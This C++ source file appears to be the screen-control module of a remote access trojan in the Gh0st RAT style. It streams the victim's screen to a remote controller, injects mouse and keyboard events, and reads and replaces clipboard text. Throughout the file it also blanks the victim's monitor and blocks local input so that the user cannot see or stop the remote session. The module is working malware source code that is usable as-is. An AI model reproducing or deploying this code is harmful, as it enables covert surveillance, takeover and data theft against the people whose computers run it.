#include "StdAfx.h"
#include "ScreenManager.h"
#include "ClientSocket.h"
#include "until.h"


BOOL IsContiue;

CScreenManager::CScreenManager(CClientSocket *pClient):CManager(pClient)
{
	m_bAlgorithm = ALGORITHM_SCAN;
	m_biBitCount = 8;
	m_pScreenSpy = new CScreenSpy(8);
	m_bIsWorking = TRUE;
	m_bIsBlankScreen = FALSE;
	m_bIsBlockInput = FALSE;
	m_bIsCaptureLayer = FALSE;
	//IsContiue=FALSE;

	m_hWorkThread = MyCreateThread(NULL, 0, WorkThread, this, 0, NULL, TRUE);
	m_hBlankThread = MyCreateThread(NULL, 0, ControlThread, this, 0, NULL, TRUE);
}

CScreenManager::~CScreenManager()
{
	::InterlockedExchange((LPLONG)&m_bIsBlankScreen, FALSE);
	::InterlockedExchange((LPLONG)&m_bIsWorking, FALSE);
	::WaitForSingleObject(m_hWorkThread, INFINITE);
	::WaitForSingleObject(m_hBlankThread, INFINITE);
	::CloseHandle(m_hWorkThread);
	::CloseHandle(m_hBlankThread);

	SAFE_DELETE(m_pScreenSpy);
}

void CScreenManager::ResetScreen(int biBitCount)
{

	m_bIsWorking = FALSE;
	::WaitForSingleObject(m_hWorkThread, INFINITE);
	::CloseHandle(m_hWorkThread);
	m_hWorkThread = NULL;

	SAFE_DELETE(m_pScreenSpy);

	if (biBitCount == 3)		//4位灰度
	{
		m_pScreenSpy = new CScreenSpy(4, TRUE);
	}
	else if (biBitCount == 7)	//8位灰度
	{
		m_pScreenSpy = new CScreenSpy(8, TRUE);
	}
// 	else if (biBitCount == -1)	//停止
// 	{
// 		return;
// 
// 	}
	else
	{
		m_pScreenSpy = new CScreenSpy(biBitCount);
	}

	m_pScreenSpy->SetAlgorithm(m_bAlgorithm);
	m_pScreenSpy->SetCaptureLayer(m_bIsCaptureLayer);

	m_biBitCount = biBitCount;

	m_bIsWorking = TRUE;
	m_hWorkThread = MyCreateThread(NULL, 0, WorkThread, this, 0, NULL, TRUE);
}

void CScreenManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
{
	BYTE nValue = lpBuffer[0];
	switch (nValue)
	{
	case COMMAND_NEXT:
		//通知内核远程控制端对话框已打开,WaitForDialogOpen可以返回
		NotifyDialogIsOpen();
		break;

	case COMMAND_SCREEN_RESET:
		__try
		{
			ResetScreen(*(LPBYTE)&lpBuffer[1]);

		}
		__except(1){}
		break;

	case COMMAND_ALGORITHM_RESET:
		__try
		{
			m_bAlgorithm = *(LPBYTE)&lpBuffer[1];
			m_pScreenSpy->SetAlgorithm(m_bAlgorithm);

		}
		__except(1){}

		break;

	case COMMAND_SCREEN_CTRL_ALT_DEL:
		::SimulateCtrlAltDel();
		break;
	case COMMAND_SCREEN_CONTINUE:
		IsContiue=TRUE;
		break;

	case COMMAND_SCREEN_CONTROL:
		//远程仍然可以操作
		::BlockInput(FALSE);
		ProcessCommand(lpBuffer + 1, nSize - 1);
		::BlockInput(m_bIsBlockInput);
		break;

	case COMMAND_SCREEN_BLOCK_INPUT: //ControlThread里锁定
		m_bIsBlockInput = *(LPBYTE)&lpBuffer[1];
		break;

	case COMMAND_SCREEN_BLANK:
		m_bIsBlankScreen = *(LPBYTE)&lpBuffer[1];
		break;

	case COMMAND_SCREEN_CAPTURE_LAYER:
		m_bIsCaptureLayer = *(LPBYTE)&lpBuffer[1];
		m_pScreenSpy->SetCaptureLayer(m_bIsCaptureLayer);
		break;

	case COMMAND_SCREEN_GET_CLIPBOARD:
		SendLocalClipboard();
		break;

	case COMMAND_SCREEN_SET_CLIPBOARD:
		UpdateLocalClipboard((char *)lpBuffer + 1, nSize - 1);
		break;

	default:
		break;
	}
}

void CScreenManager::sendBITMAPINFO()
{
	DWORD dwBytesLength = 1 + m_pScreenSpy->GetBISize();
	LPBYTE lpBuffer = (LPBYTE)::VirtualAlloc(NULL, dwBytesLength, MEM_COMMIT, PAGE_READWRITE);
	lpBuffer[0] = TOKEN_BITMAPINFO;
	::CopyMemory(lpBuffer + 1, m_pScreenSpy->GetBI(), dwBytesLength - 1);
	Send(lpBuffer, dwBytesLength);
	::VirtualFree(lpBuffer, 0, MEM_RELEASE);	
}

void CScreenManager::sendFirstScreen()
{
	LPVOID lpFirstScreen = m_pScreenSpy->GetFirstScreen();
	if (lpFirstScreen == NULL)
	{
		return;
	}

	DWORD dwBytesLength = 1 + m_pScreenSpy->GetFirstImageSize();
	LPBYTE lpBuffer = new BYTE[dwBytesLength];
	if (lpBuffer == NULL)
	{
		return;
	}

	lpBuffer[0] = TOKEN_FIRSTSCREEN;
	::CopyMemory(lpBuffer + 1, lpFirstScreen, dwBytesLength - 1);

	Send(lpBuffer, dwBytesLength);
	SAFE_DELARRAY(lpBuffer);
}

int CScreenManager::sendNextScreen()
{
	DWORD dwBytes = 0;
	LPVOID lpNetScreen = m_pScreenSpy->GetNextScreen(&dwBytes);
	if (dwBytes == 0 || !lpNetScreen)
	{
		return 0 ;
	}

	DWORD dwBytesLength = 1 + dwBytes;
	LPBYTE lpBuffer = new BYTE[dwBytesLength];
	if (!lpBuffer)
	{
		return 0;
	}
	
	lpBuffer[0] = TOKEN_NEXTSCREEN;
	::CopyMemory(lpBuffer + 1, (const char *)lpNetScreen, dwBytes);

	int iRet=Send(lpBuffer, dwBytesLength);
	SAFE_DELARRAY(lpBuffer);
	return iRet;
}

DWORD WINAPI CScreenManager::WorkThread(LPVOID lparam)
{
	CScreenManager *pThis = (CScreenManager *)lparam;
	__try //控制端强制关闭时会出错
    {
		pThis->sendBITMAPINFO();

		DWORD dwcount=0;

		//等控制端对话框打开
		pThis->WaitForDialogOpen();
		pThis->sendFirstScreen();

	//	printf("dwcount %d IsContiue %d\r\n",dwcount,IsContiue);

		while (pThis->m_bIsWorking)
		{
			pThis->sendNextScreen();
			//printf("dwcount %d IsContiue %d\r\n",dwcount,IsContiue);
			if (IsContiue) 
			{
				IsContiue=FALSE;
				dwcount=0;
			}
			else dwcount++;

			if (dwcount>200)
			{
				break;
			}
			Sleep(5);

		}

	//	printf("exit\r\n");

	}
    __except(EXCEPTION_EXECUTE_HANDLER)
    {
	//	printf("erro\r\n");


        return 0;
    };


	

	return 0;
}

//创建这个线程主要是为了保持一直黑屏
DWORD WINAPI CScreenManager::ControlThread(LPVOID lparam)
{
	static BOOL bIsScreenBlanked = FALSE;
	CScreenManager *pThis = (CScreenManager *)lparam;
	while (pThis->IsConnect())
	{
		//加快反应速度
		for (int i = 0; i < 100; i++)
		{
			if (!pThis->IsConnect())
			{
				break;
			}

			//分辨率大小改变了
			if (pThis->IsMetricsChange())
			{
				pThis->ResetScreen(pThis->GetCurrentPixelBits());
			}

			Sleep(10);
		}

		if (pThis->m_bIsBlankScreen)
		{
			::SystemParametersInfo(SPI_SETPOWEROFFACTIVE, 1, NULL, 0);
			::SendMessage(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, (LPARAM)2);//the display is being shut off
			bIsScreenBlanked = TRUE;
		}
		else
		{
			if (bIsScreenBlanked)
			{
				::SystemParametersInfo(SPI_SETPOWEROFFACTIVE, 0, NULL, 0);
				::SendMessage(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, (LPARAM)-1);//the display is powering on
				bIsScreenBlanked = FALSE;
			}
		}

		::BlockInput(pThis->m_bIsBlockInput);

		//分辨率大小改变了
		if (pThis->IsMetricsChange())
		{
			pThis->ResetScreen(pThis->GetCurrentPixelBits());
		}
	}

	::BlockInput(FALSE);
	return -1;
}

void CScreenManager::ProcessCommand( LPBYTE lpBuffer, UINT nSize )
{
	//数据包不合法
	if (nSize % sizeof(MSG) != 0)
	{
		return;
	}

	SwitchInputDesktop();

	//命令个数
	int	nCount = nSize / sizeof(MSG);

	//处理多个命令
	for (int i = 0; i < nCount; i++)
	{
		MSG	*pMsg = (MSG *)(lpBuffer + i * sizeof(MSG));
		switch (pMsg->message)
		{
			case WM_LBUTTONDOWN:
			case WM_LBUTTONUP:
			case WM_RBUTTONDOWN:
			case WM_RBUTTONUP:
			case WM_MOUSEMOVE:
			case WM_LBUTTONDBLCLK:
			case WM_RBUTTONDBLCLK:
			case WM_MBUTTONDOWN:
			case WM_MBUTTONUP:
				{
					POINT point;
					point.x = LOWORD(pMsg->lParam);
					point.y = HIWORD(pMsg->lParam);
					SetCursorPos(point.x, point.y);
					SetCapture(WindowFromPoint(point));
				}
				break;

			default:
				break;
		}

		switch(pMsg->message)
		{
			case WM_LBUTTONDOWN:
				mouse_event(MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0);
				break;

			case WM_LBUTTONUP:
				mouse_event(MOUSEEVENTF_LEFTUP, 0, 0, 0, 0);
				break;

			case WM_RBUTTONDOWN:
				mouse_event(MOUSEEVENTF_RIGHTDOWN, 0, 0, 0, 0);
				break;

			case WM_RBUTTONUP:
				mouse_event(MOUSEEVENTF_RIGHTUP, 0, 0, 0, 0);
				break;

 			case WM_LBUTTONDBLCLK:
				mouse_event(MOUSEEVENTF_LEFTDOWN | MOUSEEVENTF_LEFTUP, 0, 0, 0, 0);
				mouse_event(MOUSEEVENTF_LEFTDOWN | MOUSEEVENTF_LEFTUP, 0, 0, 0, 0);
 				break;

 			case WM_RBUTTONDBLCLK:
 				mouse_event(MOUSEEVENTF_RIGHTDOWN | MOUSEEVENTF_RIGHTUP, 0, 0, 0, 0);
				mouse_event(MOUSEEVENTF_RIGHTDOWN | MOUSEEVENTF_RIGHTUP, 0, 0, 0, 0);
 				break;

			case WM_MBUTTONDOWN:
				mouse_event(MOUSEEVENTF_MIDDLEDOWN, 0, 0, 0, 0);
 				break;

			case WM_MBUTTONUP:
				mouse_event(MOUSEEVENTF_MIDDLEUP, 0, 0, 0, 0);
				break;

			case WM_MOUSEWHEEL:
				mouse_event(MOUSEEVENTF_WHEEL, 0, 0, GET_WHEEL_DELTA_WPARAM(pMsg->wParam), 0);
				break;

			case WM_KEYDOWN:
			case WM_SYSKEYDOWN:
				keybd_event((BYTE)pMsg->wParam, (BYTE)MapVirtualKey(pMsg->wParam, 0), 0, 0);
				break;

			case WM_KEYUP:
			case WM_SYSKEYUP:
				keybd_event((BYTE)pMsg->wParam, (BYTE)MapVirtualKey(pMsg->wParam, 0), KEYEVENTF_KEYUP, 0);
				break;

			default:
				break;
		}
	}	
}

void CScreenManager::UpdateLocalClipboard( char *buf, int len )
{
	if (!::OpenClipboard(NULL))
	{
		return;
	}
	
	::EmptyClipboard();
	HGLOBAL hglbCopy = ::GlobalAlloc(GMEM_DDESHARE, len);
	if (hglbCopy != NULL)
	{ 
		//Lock the handle and copy the text to the buffer.  
		LPTSTR lptstrCopy = (LPTSTR) GlobalLock(hglbCopy); 
		memcpy(lptstrCopy, buf, len); 
		::GlobalUnlock(hglbCopy);          //Place the handle on the clipboard.  
		::SetClipboardData(CF_TEXT, hglbCopy);
		::GlobalFree(hglbCopy);
	}

	CloseClipboard();
}

void CScreenManager::SendLocalClipboard()
{
	if (!::OpenClipboard(NULL))
	{
		return;
	}

	HGLOBAL hglb = ::GetClipboardData(CF_TEXT);
	if (hglb == NULL)
	{
		::CloseClipboard();
		return;
	}

	int	nPacketLen = ::GlobalSize(hglb) + 1;
	LPSTR lpstr = (LPSTR)::GlobalLock(hglb);  
	LPBYTE	lpData = new BYTE[nPacketLen];
	lpData[0] = TOKEN_CLIPBOARD_TEXT;
	memcpy(lpData + 1, lpstr, nPacketLen - 1);
	::GlobalUnlock(hglb); 
	::CloseClipboard();
	Send(lpData, nPacketLen);

	SAFE_DELARRAY(lpData);
}


//屏幕分辨率是否发生改变
BOOL CScreenManager::IsMetricsChange()
{
	LPBITMAPINFO lpbmi =	m_pScreenSpy->GetBI();

	BOOL bRet = (lpbmi->bmiHeader.biWidth != ::GetSystemMetrics(SM_CXSCREEN)) 
		|| (lpbmi->bmiHeader.biHeight != ::GetSystemMetrics(SM_CYSCREEN));

	return bRet;
}

BOOL CScreenManager::IsConnect()
{
	return m_pClient->IsRunning();
}

int CScreenManager::GetCurrentPixelBits()
{
	return m_biBitCount;
}